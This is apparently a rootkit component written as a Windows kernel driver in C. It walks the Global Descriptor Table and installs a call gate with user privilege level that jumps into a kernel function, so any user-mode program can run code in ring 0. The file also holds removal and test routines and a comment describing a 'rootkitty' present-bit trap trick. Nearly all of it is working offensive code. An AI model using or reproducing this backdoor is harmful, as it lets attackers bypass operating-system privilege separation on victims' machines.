
/* Mad ShoutZ to crazylord */

#include "ntddk.h"
#include "common.h"
#include "serial.h"
#include "gdt.h"

void mycallgate_function(); 

#pragma pack(1)

/* sgdt returns gdt in this format */
typedef struct
{
	unsigned short BaseLimit;
	unsigned short BaseLow;
	unsigned short BaseHigh;
} GDTINFO;

/* 
	callgate specific casting of descriptor
	---------------------------------------
	A call-gate descriptor may reside in the
	GDT or in an LDT, but not in the interrupt descriptor table (IDT). It performs six functions:
	• It specifies the code segment to be accessed.
	• It defines an entry point for a procedure ***in the specified code segment***.
	• It specifies the privilege level required for a caller trying to access the procedure.
	• If a stack switch occurs, it specifies the number of optional parameters to be copied
	between stacks.
	• It defines the size of values to be pushed onto the target stack: 16-bit gates force 16-bit
	pushes and 32-bit gates force 32-bit pushes.
	• It specifies whether the call-gate descriptor is valid.
*/
typedef struct
{
	// [3][2][1][0]
    unsigned short	 offset_low;				// offset in specified code segment LOWORD
    unsigned short   code_segment_selector;		// code segment to use	

	// [4]
    unsigned char    param_count : 5;			// The parameter count field indicates the number of parameters 
												// to copy from the calling procedures stack to the new stack if 
												// a stack switch occurs. The parameter count specifies the number 
												// of words for 16-bit call gates and doublewords for 32-bit call gates.
												// In most cases, when calling ring0 from ring3, a stack switch will occur
												// to the ring0 stack, which is set using the SS and ESP registers pulled 
												// from the TSS
    unsigned char    unused : 3; 			

	// [5] access
	unsigned char		type		: 4; /* subtype, should be STYPE_CALL32 in most cases for a 32 bit callgate */
	unsigned char		desc_type   : 1; /* must be 0==SYSTEM descriptor) */
    unsigned char		dpl         : 2; /* which ring, set to 3 if you want usermode code to call this */
    unsigned char		present     : 1; /* segment present? 1==yes */

	// [7][6]
    unsigned short  offset_high;				// offset in specified code segment HIWORD
} CALLGATE_DESCRIPTOR, *PCALLGATE_DESCRIPTOR;

// generic 64 bit descriptor
// see Intel Software Dev Manual, chapter 3, page 92
typedef struct
{
	// [3][2][1][0]
	unsigned short		limit_low;		/* limit specifies the size of the segment, combined w/ limit_middle for 20 bits */
										/* if granularity is 1 byte, then segment can be 1byte-1Mbyte in 1byte increments */
										/* if granularity is 4k, then segment can be 4K-4Gbytes in 4K increments */
    unsigned short		base_low;		/* all bases are combined into a single 32 bit address, should be 16 byte boundary aligned */

	// [4]
    unsigned char		base_middle;
    
	// [5] access
	unsigned char		type		: 4; /* subtype, parsed based on what desc_type is set to */
	unsigned char		desc_type   : 1; /* descriptor type (1== CODE or DATA descriptor, 0==SYSTEM descriptor) */
    unsigned char		dpl         : 2; /* which ring */
    unsigned char		present     : 1; /* segment present? 1==yes */
										 /* ---------------------------------------------------------------------------------------------
										  * Note: there is subtle rootkit trick in setting present to 0 for a segment you want to control
										  * Here, the P flag is initially set to 0 causing a trap to the not-present exception handler. 
										  * The exception handler then does some rootkitty stuff and sets the P flag to 1, so that on 
										  * returning from the handler, the gate descriptor will be valid.
										  * --------------------------------------------------------------------------------------------- */
    // [6] granularity
	unsigned char		limit_middle: 4;	
    unsigned char		available   : 1; /* available for system (always set to zero) */
    unsigned char		zero        : 1; /* always zero */
	unsigned char		operand_size: 1; /* operand size (0==16bit 1==32bit) */
    unsigned char		granularity : 1; /* granularity (0==1byte, 1==4kbyte) */

    // [7]
	unsigned char		base_high;

} DESCRIPTOR_ENTRY, *PDESCRIPTOR_ENTRY;

typedef struct subtype
{
	union
	{
		/* type, depends on desc_type setting */
		/* if desc_type is 1, then type specified CODE or DATA (hi order bit of this field) */
		struct 
		{
			unsigned char		accessed				: 1;	/* 1==accessed */
			unsigned char		write_enable			: 1;	/* 0==read only, 1==read/write */
			unsigned char		expansion_direction		: 1;	/* 0==expand up, 1==expand down */
			unsigned char		zero					: 1;	/* MUST be set to zero */
		} datatype;

		struct 
		{
			unsigned char		accessed				: 1;	/* 1==accessed */
			unsigned char		read_enable				: 1;	/* 0==execute only, 1==execute/read */
			unsigned char		conforming				: 1;	/* 1==conforming */
			unsigned char		one						: 1;	/* MUST be set to one */
		} codetype;

		/* if desc_type is 0, then type specified SYSTEM */
		/* use this table of defines to determine which one it is */
		/* ------------------------------------------------------ */
		/* reserved				0x00							*/
		#define STYPE_TSS16A	0x01 /* 16-bit TSS (Available)	*/
		#define STYPE_LDT		0x02 /* LDT						*/
		#define STYPE_TSS16B	0x03 /* 16-bit TSS (Busy)		*/
		#define STYPE_CALL16	0x04 /* 16-bit Call Gate		*/
		#define STYPE_TASK		0x05 /* Task Gate				*/
		#define STYPE_INT16		0x06 /* 16-bit Interrupt Gate	*/
		#define STYPE_TRAP16	0x07 /* 16-bit Trap Gate		*/
		/* reserved				0x08							*/
		#define STYPE_TSS32A	0x09 /* 32-bit TSS (Available)	*/
		/* reserved				0x0A							*/ 
		#define STYPE_TSS32B	0x0B /* 32-bit TSS (Busy)		*/
		#define STYPE_CALL32	0x0C /* 32-bit Call Gate		*/
		/* reserved				0x0D							*/
		#define STYPE_INT32		0x0E /* 32-bit Interrupt Gate	*/
		#define STYPE_TRAP32	0x0F /* 32-bit Trap Gate		*/
		/* ------------------------------------------------------ */
		unsigned char	systemtype      : 4;	/* see above table */
		unsigned char	databyte;				/* used to align structure into a full byte */
	} u; //union of various ways to interpret type field
	
} SUBTYPE, *PSUBTYPE;

#pragma pack()

char * GetSystemType( SUBTYPE type )
{
	switch(type.u.systemtype)
	{
	case STYPE_TSS16A:
		return "16-bit TSS (Available)";
		break;
	case STYPE_LDT:
		return "LDT";
		break;
	case STYPE_TSS16B:
		return "16-bit TSS (Busy)";
		break;
	case STYPE_CALL16:
		return "16-bit Call Gate";
		break;
	case STYPE_TASK:
		return "Task Gate";
		break;
	case STYPE_INT16:
		return "16-bit Interrupt Gate";
		break;
	case STYPE_TRAP16:
		return "16-bit Trap Gate";
		break;
	case STYPE_TSS32A:
		return "32-bit TSS (Available)";
		break;
	case STYPE_TSS32B:
		return "32-bit TSS (Busy)";
		break;
	case STYPE_CALL32:
		return "32-bit Call Gate";
		break;
	case STYPE_INT32:
		return "32-bit Interrupt Gate";
		break;
	case STYPE_TRAP32:
		return "32-bit Trap Gate";
		break;
	default:
		break;
	}
	return "Reserved";
}

char * GetDescriptorType( PDESCRIPTOR_ENTRY p )
{
	SUBTYPE st;
	st.u.databyte = p->type;

	if(p->desc_type == 0) return GetSystemType( st );

	if(st.u.datatype.zero == 0)
	{
		// data
		return "DATA";
	}
	else /* st.u.codetype.one == 1 */
	{
		// code
		return "CODE";
	}

	return "UNKNOWN";
}

VOID DumpGDT()
{
	int i;
	GDTINFO gdtinfo;
	unsigned long gdtbase;
	PDESCRIPTOR_ENTRY pcgd_base;

	__asm sgdt gdtinfo
	gdtbase = MAKELONG(gdtinfo.BaseLow, gdtinfo.BaseHigh);
	
	DbgPrint("Rootkit: got GDT base address 0x%08X", gdtbase);
	conprintf("GDTBase=0x%08X  Limit=0x%04X\r\n", gdtbase, gdtinfo.BaseLimit);
	DbgPrint("Rootkit: sizeof( DESCRIPTOR_ENTRY ) %d", sizeof(DESCRIPTOR_ENTRY) );
	DbgPrint("Rootkit: sizeof( SUBTYPE ) %d", sizeof(SUBTYPE) );

	// enumerate all entries in the GDT
	// we can use the callgate descriptor structure because it
	// carries common members w/ other GDT entry types
	pcgd_base = (PDESCRIPTOR_ENTRY) gdtbase;
	for(i=1;i<=gdtinfo.BaseLimit>>3;i++)
	{
		conprintf("%04X    %24s  %08X  %08X  %d    %s\t%s \r\n",
					i * 8,
					GetDescriptorType(&pcgd_base[i]),
					0,
					0,
					pcgd_base[i].dpl,
					pcgd_base[i].present ? "P" : "NP",
					"??" );
	}
}

// return -1 if none found
int GetFirstAvailableGDTSlot()
{
	int i;
	GDTINFO gdtinfo;
	unsigned long gdtbase;
	PDESCRIPTOR_ENTRY pcgd_base;

	__asm sgdt gdtinfo
	gdtbase = MAKELONG(gdtinfo.BaseLow, gdtinfo.BaseHigh);
	
	DbgPrint("Rootkit: got GDT base address 0x%08X", gdtbase);
	pcgd_base = (PDESCRIPTOR_ENTRY) gdtbase;
	for(i=1;i<=gdtinfo.BaseLimit>>3;i++)
	{
		if( 0 == pcgd_base[i].present ) return i;
	}
	return -1;
}

int InstallCallgate()
{
	GDTINFO gdtinfo;
	unsigned long gdtbase;
	unsigned long sanity_check;
	unsigned long function_offset;
	PCALLGATE_DESCRIPTOR pcgd_base;

	int offset = GetFirstAvailableGDTSlot();
	if(offset == -1) return -1; //error

	DbgPrint("found free GDT entry, number %d", offset);

	__asm sgdt gdtinfo
	gdtbase = MAKELONG(gdtinfo.BaseLow, gdtinfo.BaseHigh);
	DbgPrint("Rootkit: got GDT base address 0x%08X", gdtbase);
	pcgd_base = (PCALLGATE_DESCRIPTOR) gdtbase;

	DbgPrint("adding callgate to address 0x%08X", mycallgate_function);

	// first, we must choose a code segment that contains the code we wish to execute
	// we could allocate a new one, but since Windows already has code segments that cover
	// the entire range of memory, we can just use of the pre-existing ones.
	// code segment 0x08 is always there, and is a ring-0 code segment covering 0x00000000-0xFFFFFFFF
	pcgd_base[offset].code_segment_selector = 0x08;

	// setup the address of our function as the offset into the specified code segment.  Since
	// code segment 8 starts at the base of linear memory, we don't need to do any fixups on anything.
	// we just plug in the linear address of our function.
	//
	// Note: every process has it's own page tables under NT, so it stands to reason that if the function
	// exists in memory that is not consistently mapped across all processes, the callgate might go astray
	// depending on who calls it.  Since all kernel memory (above 0x7FFFFFFF) is mapped the same across procii, we
	// should be OK since our function is up here in the kernel.
	function_offset = (unsigned long)(mycallgate_function);
	pcgd_base[offset].offset_low  = (unsigned short)(function_offset & 0xFFFF);
	pcgd_base[offset].offset_high = (unsigned short)((function_offset >> 16) & 0xFFFF);

	//we will pass 4 32bit parameters
	pcgd_base[offset].param_count	= 4; 
	pcgd_base[offset].unused		= 0;
	
	// set type to 32-bit callgate
	pcgd_base[offset].type			= STYPE_CALL32;
	pcgd_base[offset].desc_type		= 0;
		    
	// must be 3 if ring3 code is to call us
	pcgd_base[offset].dpl          = 3;     

	// set to present, otherwise we don't exist! :-)
	pcgd_base[offset].present      = 1;
	
	DbgPrint("callgate added");

	sanity_check = MAKELONG(pcgd_base[offset].offset_low, pcgd_base[offset].offset_high);
	DbgPrint("sanity check, we are calling function 0x%08X", sanity_check);

	return offset;
}

typedef struct _MYCALL_FRAME
{
	DWORD	calling_eip;
	DWORD	calling_cs;
	DWORD	arg_0;
	DWORD	arg_1;
	DWORD	arg_2;
	DWORD	arg_3;
} MYCALL_FRAME, *PMYCALL_FRAME;

DWORD __stdcall MyCallGateFunction(PMYCALL_FRAME f)
{
	//conprintf(	"hello callgate, you passed:\r\n arg_0: 0x%08X \r\n arg_1: 0x%08X \r\n arg_2: 0x%08X \r\n arg_3: 0x%08X \r\n calling_eip: 0x%08X \r\n calling_cs: 0x%08X \r\n",
	//	f->arg_0,
	//	f->arg_1,
	//	f->arg_2,
	//	f->arg_3,
	//	f->calling_eip,
	//	f->calling_cs );

	conprintf("CALL_FRAME: 0x%08X\r\n", f);
	conprintf("arg_0: 0x%08X\r\n", f->arg_0);
	conprintf("arg_0: 0x%08X\r\n", f->arg_1);
	conprintf("arg_0: 0x%08X\r\n", f->arg_2);
	conprintf("arg_0: 0x%08X\r\n", f->arg_3);

	return 0;
}

// this wraps the call to the MyCallGateFunction and sets up it's parameters frame
// for ease of use.
void __declspec(naked) mycallgate_function() 
{ 
   __asm 
   {
		pushad					// save all general purpose registers
		pushfd					// save the flags register
		mov		eax, esp		// 
		add		eax, 0x24		// room taken by the pushad/pushfd instructions
		push	eax
		call	MyCallGateFunction	// call function (stdcall cleans it's own stack)

		popfd					// restore registers pushed by pushfd
		popad					// restore registers pushed by pushad
		retf 16					// 4 DWORDS - you must retf <sizeof arguments in bytes> if you pass arguments
   }
}

VOID RemoveCallgate(int GDT_Selector)
{
	GDTINFO gdtinfo;
	unsigned long gdtbase;
	PCALLGATE_DESCRIPTOR pcgd_base;

	__asm sgdt gdtinfo
	gdtbase = MAKELONG(gdtinfo.BaseLow, gdtinfo.BaseHigh);
	DbgPrint("Rootkit: got GDT base address 0x%08X", gdtbase);
	pcgd_base = (PCALLGATE_DESCRIPTOR) gdtbase;
	
	DbgPrint("removing callgate");
	if(pcgd_base[GDT_Selector].present)
	{
		pcgd_base[GDT_Selector].present = 0;
		DbgPrint("callgate removed");
	}
	else
	{
		DbgPrint("error: no callgate to remove.");
	}
}


void TestCallgate(int GDT_Selector)
{
	/* 
		To access a call gate, a far pointer to the gate is provided as a target 
		operand in a CALL or JMP instruction. The segment selector from this pointer 
		identifies the call gate. The offset from the pointer is  required, but not 
		used or checked by the processor. (The offset can be set to any value.)
	*/

	// the assembler won't generate a far call for us, so we use this hack to force
	// a far call.

	// call FAR 0x69:0xAAAAAAAA
	//          ^^^^--- remember that this is the only part that matters - it must
	//                  match the callgate entry in the GDT

	DWORD	res = 0x777;
	WORD	farcall[3];
	WORD	selector = (WORD) GDT_Selector;
	
	farcall[0] = 0xAAAA;
	farcall[1] = 0xAAAA;
	farcall[2] = (selector<<3);

	DbgPrint("about to call thru callgate %d", GDT_Selector);

	__asm
    {
        push	0x444
		push	0x333
		push	0x222
		push	0x111
        call fword ptr [farcall]
        mov res,eax
    }

	DbgPrint("result was 0x%08X", res);
}

